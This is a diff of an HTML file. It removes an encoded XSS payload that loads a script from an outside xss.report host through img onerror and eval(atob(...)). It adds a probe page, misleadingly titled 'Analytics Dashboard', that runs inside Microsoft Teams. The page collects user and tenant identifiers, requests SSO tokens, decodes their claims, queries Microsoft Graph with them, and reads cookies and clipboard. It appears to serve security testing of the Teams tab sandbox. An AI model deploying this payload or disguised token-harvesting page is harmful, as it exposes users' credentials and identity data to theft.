@@ -1,5 +1,500 @@
+<!DOCTYPE html>
 <html>
-    <h1>teste</h1>
-    "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3p0bHNhdmlvciI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>
-    <iframe src=x></iframe>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Analytics Dashboard</title>
+<script src="https://res.cdn.office.net/teams-js/2.19.0/js/MicrosoftTeams.min.js"></script>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: 'Segoe UI', -apple-system, sans-serif; background: #1a1a2e; color: #e0e0e0; padding: 12px; font-size: 13px; }
+  h2 { color: #00d4ff; font-size: 16px; margin: 12px 0 6px; border-bottom: 1px solid #333; padding-bottom: 4px; }
+  .section { background: #16213e; border-radius: 8px; padding: 10px; margin-bottom: 10px; }
+  .row { display: flex; justify-content: space-between; padding: 3px 0; border-bottom: 1px solid #1a1a2e; }
+  .label { color: #888; }
+  .value { color: #0f0; font-family: monospace; word-break: break-all; max-width: 60%; text-align: right; }
+  .value.warn { color: #ff0; }
+  .value.danger { color: #f00; }
+  .value.info { color: #00d4ff; }
+  #log { background: #0d1117; padding: 8px; border-radius: 6px; font-family: monospace; font-size: 11px; max-height: 300px; overflow-y: auto; white-space: pre-wrap; }
+  .log-entry { margin: 2px 0; }
+  .copy-btn { background: #0078d4; color: white; border: none; padding: 8px 16px; border-radius: 4px; font-size: 13px; margin: 4px; cursor: pointer; }
+  .test-btn { background: #333; color: #0f0; border: 1px solid #0f0; padding: 6px 12px; border-radius: 4px; font-size: 12px; margin: 3px; cursor: pointer; }
+  #exportArea { display: none; }
+</style>
+</head>
+<body>
+
+<h2>Environment Detection</h2>
+<div class="section" id="envSection"></div>
+
+<h2>Teams SDK Context</h2>
+<div class="section" id="sdkSection"></div>
+
+<h2>Security Boundaries</h2>
+<div class="section" id="secSection"></div>
+
+<h2>Capability Tests</h2>
+<div class="section" id="capSection">
+  <button class="test-btn" onclick="testClipboard()">Test Clipboard</button>
+  <button class="test-btn" onclick="testCamera()">Test Camera</button>
+  <button class="test-btn" onclick="testGeo()">Test Geolocation</button>
+  <button class="test-btn" onclick="testNotification()">Test Notification</button>
+  <button class="test-btn" onclick="testDownload()">Test File Download</button>
+  <button class="test-btn" onclick="testPopup()">Test window.open</button>
+  <button class="test-btn" onclick="testRedirect()">Test Redirect</button>
+  <button class="test-btn" onclick="testSchemes()">Test URL Schemes</button>
+  <div id="capResults" style="margin-top: 8px;"></div>
+</div>
+
+<h2>Navigation & Protocol Tests</h2>
+<div class="section" id="navSection">
+  <button class="test-btn" onclick="testDeepLink('msteams://teams.microsoft.com/l/chat/0/0?users=admin@tenant.com')">ms-teams:// link</button>
+  <button class="test-btn" onclick="testDeepLink('tel:+1234567890')">tel: link</button>
+  <button class="test-btn" onclick="testDeepLink('mailto:test@test.com')">mailto: link</button>
+  <button class="test-btn" onclick="testDeepLink('sms:+1234567890')">sms: link</button>
+  <button class="test-btn" onclick="testIframe()">Embed iframe</button>
+  <button class="test-btn" onclick="testPostMessage()">postMessage to parent</button>
+  <div id="navResults" style="margin-top: 8px;"></div>
+</div>
+
+<h2>SSO & Token Tests</h2>
+<div class="section" id="ssoSection">
+  <button class="test-btn" onclick="testSSO()">Request SSO Token</button>
+  <button class="test-btn" onclick="testAuthPopup()">Auth Popup (Teams SDK)</button>
+  <div id="ssoResults" style="margin-top: 8px;"></div>
+</div>
+
+<h2>Event Log</h2>
+<div id="log"></div>
+
+<div style="margin-top: 10px; text-align: center;">
+  <button class="copy-btn" onclick="exportResults()">Export All Results</button>
+  <button class="copy-btn" onclick="copyLog()">Copy Log</button>
+</div>
+
+<textarea id="exportArea" rows="10" style="width:100%; margin-top:8px; background:#0d1117; color:#0f0; border:1px solid #333; font-size:11px;"></textarea>
+
+<script>
+var results = {};
+var logEntries = [];
+
+function log(msg, level) {
+  var ts = new Date().toISOString().substr(11, 12);
+  var entry = '[' + ts + '] ' + (level ? '[' + level + '] ' : '') + msg;
+  logEntries.push(entry);
+  var el = document.getElementById('log');
+  var div = document.createElement('div');
+  div.className = 'log-entry';
+  div.style.color = level === 'CRITICAL' ? '#f00' : level === 'WARN' ? '#ff0' : level === 'OK' ? '#0f0' : '#888';
+  div.textContent = entry;
+  el.appendChild(div);
+  el.scrollTop = el.scrollHeight;
+}
+
+function addRow(sectionId, label, value, cls) {
+  var section = document.getElementById(sectionId);
+  var row = document.createElement('div');
+  row.className = 'row';
+  row.innerHTML = '<span class="label">' + label + '</span><span class="value ' + (cls || '') + '">' + value + '</span>';
+  section.appendChild(row);
+  results[label] = value;
+}
+
+function addResult(sectionId, text, cls) {
+  var section = document.getElementById(sectionId);
+  var div = document.createElement('div');
+  div.className = 'row';
+  div.innerHTML = '<span class="value ' + (cls || 'info') + '" style="max-width:100%;text-align:left;">' + text + '</span>';
+  section.appendChild(div);
+}
+
+// === ENVIRONMENT DETECTION ===
+(function detectEnv() {
+  var ua = navigator.userAgent;
+  addRow('envSection', 'User-Agent', ua, 'info');
+
+  var isMobile = /iPhone|iPad|Android|Mobile/i.test(ua);
+  addRow('envSection', 'Mobile', isMobile ? 'YES' : 'NO', isMobile ? 'danger' : '');
+
+  var isTeamsApp = /Teams/i.test(ua) || /TeamsMobile/i.test(ua);
+  addRow('envSection', 'Teams UA detected', isTeamsApp ? 'YES' : 'NO', isTeamsApp ? 'warn' : '');
+
+  var isIOS = /iPhone|iPad/i.test(ua);
+  var isAndroid = /Android/i.test(ua);
+  addRow('envSection', 'Platform', isIOS ? 'iOS' : isAndroid ? 'Android' : 'Desktop/Other', 'info');
+
+  var isWKWebView = !!(window.webkit && window.webkit.messageHandlers);
+  addRow('envSection', 'WKWebView (iOS native)', isWKWebView ? 'YES' : 'NO', isWKWebView ? 'warn' : '');
+
+  addRow('envSection', 'window.parent === window', (window.parent === window) ? 'YES (not iframe)' : 'NO (in iframe)', 'info');
+  addRow('envSection', 'window.top accessible', (function() { try { return window.top.location.href ? 'YES' : 'NO'; } catch(e) { return 'BLOCKED (cross-origin)'; } })(), 'info');
+
+  addRow('envSection', 'Location', window.location.href, 'info');
+  addRow('envSection', 'Referrer', document.referrer || '(empty)', 'info');
+  addRow('envSection', 'Screen', screen.width + 'x' + screen.height + ' @' + (window.devicePixelRatio || 1) + 'x', 'info');
+
+  log('Environment: ' + (isMobile ? 'MOBILE' : 'DESKTOP') + ' | ' + (isTeamsApp ? 'Teams app' : 'Browser') + ' | ' + (isIOS ? 'iOS' : isAndroid ? 'Android' : 'Other'));
+})();
+
+// === TEAMS SDK CONTEXT ===
+(async function initTeamsSDK() {
+  log('Initializing Teams SDK...');
+  try {
+    await microsoftTeams.app.initialize();
+    log('Teams SDK initialized!', 'OK');
+    addRow('sdkSection', 'SDK Init', 'SUCCESS', 'danger');
+
+    try {
+      var ctx = await microsoftTeams.app.getContext();
+      log('Got Teams context!', 'CRITICAL');
+      addRow('sdkSection', 'Context Available', 'YES', 'danger');
+
+      var fields = {
+        'user.id': ctx.user && ctx.user.id,
+        'user.userPrincipalName': ctx.user && ctx.user.userPrincipalName,
+        'user.loginHint': ctx.user && ctx.user.loginHint,
+        'user.tenant.id': ctx.user && ctx.user.tenant && ctx.user.tenant.id,
+        'user.displayName': ctx.user && ctx.user.displayName,
+        'app.host.name': ctx.app && ctx.app.host && ctx.app.host.name,
+        'app.host.clientType': ctx.app && ctx.app.host && ctx.app.host.clientType,
+        'app.host.sessionId': ctx.app && ctx.app.host && ctx.app.host.sessionId,
+        'app.locale': ctx.app && ctx.app.locale,
+        'app.theme': ctx.app && ctx.app.theme,
+        'channel.id': ctx.channel && ctx.channel.id,
+        'channel.displayName': ctx.channel && ctx.channel.displayName,
+        'team.groupId': ctx.team && ctx.team.groupId,
+        'team.displayName': ctx.team && ctx.team.displayName,
+        'page.id': ctx.page && ctx.page.id,
+        'page.frameContext': ctx.page && ctx.page.frameContext,
+        'page.subPageId': ctx.page && ctx.page.subPageId,
+        'sharepoint.siteUrl': ctx.sharepoint && ctx.sharepoint.siteUrl,
+        'sharepoint.siteDomain': ctx.sharepoint && ctx.sharepoint.siteDomain,
+      };
+
+      for (var key in fields) {
+        if (fields[key]) {
+          addRow('sdkSection', key, String(fields[key]), 'danger');
+          log('  SDK.' + key + ' = ' + fields[key], 'CRITICAL');
+        }
+      }
+
+      results['teams_context_raw'] = JSON.stringify(ctx, null, 2);
+    } catch (e) {
+      addRow('sdkSection', 'Context', 'BLOCKED: ' + e.message, '');
+      log('Context blocked: ' + e.message, 'OK');
+    }
+
+    // Test if we can get auth token
+    try {
+      var token = await microsoftTeams.authentication.getAuthToken();
+      addRow('sdkSection', 'Auth Token', 'GOT TOKEN (first 40 chars): ' + token.substring(0, 40) + '...', 'danger');
+      log('GOT AUTH TOKEN!', 'CRITICAL');
+      results['auth_token_preview'] = token.substring(0, 80);
+
+      // Decode JWT to see claims
+      try {
+        var payload = JSON.parse(atob(token.split('.')[1]));
+        addRow('sdkSection', 'Token.aud', payload.aud || '?', 'danger');
+        addRow('sdkSection', 'Token.scp', payload.scp || '?', 'danger');
+        addRow('sdkSection', 'Token.upn', payload.upn || '?', 'danger');
+        addRow('sdkSection', 'Token.tid', payload.tid || '?', 'danger');
+        log('Token claims: aud=' + payload.aud + ' scp=' + payload.scp + ' upn=' + payload.upn, 'CRITICAL');
+        results['token_claims'] = JSON.stringify(payload, null, 2);
+      } catch(e2) {}
+    } catch (e) {
+      addRow('sdkSection', 'Auth Token', 'BLOCKED: ' + e.message, '');
+      log('Auth token blocked: ' + e.message);
+    }
+
+  } catch (e) {
+    addRow('sdkSection', 'SDK Init', 'FAILED: ' + e.message, '');
+    log('SDK init failed: ' + e.message);
+  }
+})();
+
+// === SECURITY BOUNDARIES ===
+(function checkSecurity() {
+  addRow('secSection', 'Cookies accessible', document.cookie ? 'YES: ' + document.cookie.substring(0, 60) : '(none)', document.cookie ? 'danger' : '');
+  addRow('secSection', 'localStorage', (function() { try { localStorage.setItem('_probe', '1'); localStorage.removeItem('_probe'); return 'AVAILABLE'; } catch(e) { return 'BLOCKED'; } })(), 'warn');
+  addRow('secSection', 'sessionStorage', (function() { try { sessionStorage.setItem('_probe', '1'); sessionStorage.removeItem('_probe'); return 'AVAILABLE'; } catch(e) { return 'BLOCKED'; } })(), 'warn');
+  addRow('secSection', 'indexedDB', window.indexedDB ? 'AVAILABLE' : 'BLOCKED', 'warn');
+  addRow('secSection', 'Service Worker', ('serviceWorker' in navigator) ? 'AVAILABLE' : 'BLOCKED', 'warn');
+  addRow('secSection', 'Web Workers', window.Worker ? 'AVAILABLE' : 'BLOCKED', 'info');
+  addRow('secSection', 'Shared Workers', window.SharedWorker ? 'AVAILABLE' : 'BLOCKED', 'info');
+
+  // Check CSP
+  var meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
+  addRow('secSection', 'CSP (meta)', meta ? meta.content : '(none)', 'info');
+
+  // Check if fetch to external is possible
+  fetch('https://httpbin.org/get', { mode: 'cors' })
+    .then(function(r) {
+      addRow('secSection', 'External fetch', 'ALLOWED (status ' + r.status + ')', 'danger');
+      log('External fetch allowed!', 'CRITICAL');
+    })
+    .catch(function(e) {
+      addRow('secSection', 'External fetch', 'BLOCKED: ' + e.message, '');
+      log('External fetch blocked');
+    });
+
+  // Check WebSocket
+  try {
+    var ws = new WebSocket('wss://echo.websocket.org');
+    ws.onopen = function() {
+      addRow('secSection', 'WebSocket', 'ALLOWED', 'danger');
+      log('WebSocket connection possible!', 'WARN');
+      ws.close();
+    };
+    ws.onerror = function() {
+      addRow('secSection', 'WebSocket', 'BLOCKED', '');
+    };
+  } catch(e) {
+    addRow('secSection', 'WebSocket', 'BLOCKED', '');
+  }
+
+  // Beacon API
+  addRow('secSection', 'Beacon API', navigator.sendBeacon ? 'AVAILABLE' : 'BLOCKED', navigator.sendBeacon ? 'warn' : '');
+
+  log('Security boundary checks complete');
+})();
+
+// === CAPABILITY TESTS ===
+async function testClipboard() {
+  try {
+    await navigator.clipboard.writeText('probe-test-data');
+    addResult('capResults', 'Clipboard WRITE: ALLOWED', 'danger');
+    log('Clipboard write allowed!', 'CRITICAL');
+  } catch(e) {
+    addResult('capResults', 'Clipboard WRITE: BLOCKED - ' + e.message, '');
+  }
+  try {
+    var text = await navigator.clipboard.readText();
+    addResult('capResults', 'Clipboard READ: ALLOWED - got: ' + text.substring(0, 30), 'danger');
+    log('Clipboard read allowed!', 'CRITICAL');
+  } catch(e) {
+    addResult('capResults', 'Clipboard READ: BLOCKED - ' + e.message, '');
+  }
+}
+
+async function testCamera() {
+  try {
+    var stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    stream.getTracks().forEach(function(t) { t.stop(); });
+    addResult('capResults', 'Camera: ALLOWED (got stream)', 'danger');
+    log('Camera access allowed!', 'CRITICAL');
+  } catch(e) {
+    addResult('capResults', 'Camera: ' + e.name + ' - ' + e.message, e.name === 'NotAllowedError' ? 'warn' : '');
+    log('Camera: ' + e.name);
+  }
+}
+
+function testGeo() {
+  navigator.geolocation.getCurrentPosition(
+    function(pos) {
+      addResult('capResults', 'Geolocation: ALLOWED - ' + pos.coords.latitude + ',' + pos.coords.longitude, 'danger');
+      log('Geolocation allowed!', 'CRITICAL');
+    },
+    function(e) {
+      addResult('capResults', 'Geolocation: BLOCKED - ' + e.message, '');
+      log('Geolocation blocked');
+    }
+  );
+}
+
+function testNotification() {
+  if (!('Notification' in window)) {
+    addResult('capResults', 'Notifications: NOT AVAILABLE', '');
+    return;
+  }
+  Notification.requestPermission().then(function(perm) {
+    addResult('capResults', 'Notifications: permission=' + perm, perm === 'granted' ? 'danger' : 'warn');
+    log('Notification permission: ' + perm, perm === 'granted' ? 'CRITICAL' : 'INFO');
+  });
+}
+
+function testDownload() {
+  try {
+    var a = document.createElement('a');
+    a.href = 'data:text/plain;base64,UHJvYmUgdGVzdCBmaWxl';
+    a.download = 'probe-test.txt';
+    a.click();
+    addResult('capResults', 'File download: TRIGGERED (check if file appeared)', 'warn');
+    log('Download triggered');
+  } catch(e) {
+    addResult('capResults', 'File download: BLOCKED - ' + e.message, '');
+  }
+}
+
+function testPopup() {
+  var w = window.open('about:blank', '_blank', 'width=200,height=200');
+  if (w) {
+    addResult('capResults', 'window.open: ALLOWED', 'danger');
+    log('window.open allowed!', 'WARN');
+    w.close();
+  } else {
+    addResult('capResults', 'window.open: BLOCKED (popup blocker)', '');
+    log('window.open blocked');
+  }
+}
+
+function testRedirect() {
+  addResult('capResults', 'Redirect test: will navigate in 3s to httpbin (press back to return)', 'warn');
+  log('Redirect test scheduled');
+  setTimeout(function() {
+    window.location.href = 'https://httpbin.org/html';
+  }, 3000);
+}
+
+function testSchemes() {
+  var schemes = [
+    'javascript:void(0)',
+    'data:text/html,<h1>data-uri-test</h1>',
+    'blob:null/test'
+  ];
+  schemes.forEach(function(s) {
+    try {
+      var iframe = document.createElement('iframe');
+      iframe.src = s;
+      iframe.style.display = 'none';
+      document.body.appendChild(iframe);
+      addResult('capResults', 'Scheme ' + s.split(':')[0] + ': iframe loaded (no error)', 'warn');
+    } catch(e) {
+      addResult('capResults', 'Scheme ' + s.split(':')[0] + ': BLOCKED - ' + e.message, '');
+    }
+  });
+  log('URL scheme tests done');
+}
+
+// === NAVIGATION & PROTOCOL TESTS ===
+function testDeepLink(url) {
+  try {
+    var a = document.createElement('a');
+    a.href = url;
+    a.click();
+    addResult('navResults', 'DeepLink ' + url.split(':')[0] + ': TRIGGERED', 'warn');
+    log('Deep link triggered: ' + url.substring(0, 50));
+  } catch(e) {
+    addResult('navResults', 'DeepLink ' + url.split(':')[0] + ': ERROR - ' + e.message, '');
+  }
+}
+
+function testIframe() {
+  var targets = [
+    'https://teams.microsoft.com',
+    'https://login.microsoftonline.com',
+    'https://outlook.office.com'
+  ];
+  targets.forEach(function(url) {
+    var iframe = document.createElement('iframe');
+    iframe.src = url;
+    iframe.style.width = '1px';
+    iframe.style.height = '1px';
+    iframe.onload = function() { addResult('navResults', 'iframe ' + url + ': LOADED', 'danger'); log('iframe loaded: ' + url, 'WARN'); };
+    iframe.onerror = function() { addResult('navResults', 'iframe ' + url + ': BLOCKED', ''); };
+    document.body.appendChild(iframe);
+  });
+}
+
+function testPostMessage() {
+  try {
+    window.parent.postMessage({ type: 'probe-test', data: 'hello-from-tab' }, '*');
+    addResult('navResults', 'postMessage to parent: SENT (no error)', 'warn');
+    log('postMessage sent to parent');
+  } catch(e) {
+    addResult('navResults', 'postMessage to parent: ERROR - ' + e.message, '');
+  }
+  window.addEventListener('message', function(e) {
+    addResult('navResults', 'Received message from: ' + e.origin + ' - ' + JSON.stringify(e.data).substring(0, 100), 'danger');
+    log('Got postMessage from ' + e.origin, 'CRITICAL');
+  });
+}
+
+// === SSO & TOKEN TESTS ===
+async function testSSO() {
+  try {
+    if (typeof microsoftTeams !== 'undefined' && microsoftTeams.authentication) {
+      var token = await microsoftTeams.authentication.getAuthToken({ resources: ['https://graph.microsoft.com'] });
+      addResult('ssoResults', 'SSO Token: GOT IT! ' + token.substring(0, 50) + '...', 'danger');
+      log('SSO token obtained!', 'CRITICAL');
+
+      // Try to use the token
+      var resp = await fetch('https://graph.microsoft.com/v1.0/me', {
+        headers: { 'Authorization': 'Bearer ' + token }
+      });
+      if (resp.ok) {
+        var me = await resp.json();
+        addResult('ssoResults', 'Graph /me: ' + me.displayName + ' (' + me.userPrincipalName + ')', 'danger');
+        log('Graph /me accessible with SSO token: ' + me.userPrincipalName, 'CRITICAL');
+      } else {
+        addResult('ssoResults', 'Graph /me: ' + resp.status, 'warn');
+      }
+    }
+  } catch(e) {
+    addResult('ssoResults', 'SSO Token: BLOCKED - ' + e.message, '');
+    log('SSO token blocked: ' + e.message);
+  }
+}
+
+async function testAuthPopup() {
+  try {
+    if (typeof microsoftTeams !== 'undefined' && microsoftTeams.authentication) {
+      microsoftTeams.authentication.authenticate({
+        url: window.location.origin + '/auth-start',
+        width: 600,
+        height: 535,
+        successCallback: function(result) {
+          addResult('ssoResults', 'Auth popup SUCCESS: ' + result, 'danger');
+          log('Auth popup returned: ' + result, 'CRITICAL');
+        },
+        failureCallback: function(reason) {
+          addResult('ssoResults', 'Auth popup FAILED: ' + reason, '');
+          log('Auth popup failed: ' + reason);
+        }
+      });
+    }
+  } catch(e) {
+    addResult('ssoResults', 'Auth popup ERROR: ' + e.message, '');
+    log('Auth popup error: ' + e.message);
+  }
+}
+
+// === EXPORT ===
+function exportResults() {
+  var out = {
+    timestamp: new Date().toISOString(),
+    url: window.location.href,
+    userAgent: navigator.userAgent,
+    results: results,
+    log: logEntries
+  };
+  var area = document.getElementById('exportArea');
+  area.style.display = 'block';
+  area.value = JSON.stringify(out, null, 2);
+  area.select();
+  log('Results exported to textarea');
+}
+
+function copyLog() {
+  var text = logEntries.join('\n');
+  navigator.clipboard.writeText(text).then(function() {
+    log('Log copied to clipboard');
+  }).catch(function() {
+    var area = document.getElementById('exportArea');
+    area.style.display = 'block';
+    area.value = text;
+    area.select();
+  });
+}
+
+// Catch unhandled messages
+window.addEventListener('message', function(e) {
+  if (e.data && typeof e.data === 'object' && e.data.type !== 'probe-test') {
+    log('Incoming postMessage: origin=' + e.origin + ' data=' + JSON.stringify(e.data).substring(0, 200), 'WARN');
+  }
+});
+
+log('Probe page loaded. Running automatic tests...');
+</script>
+</body>
 </html>
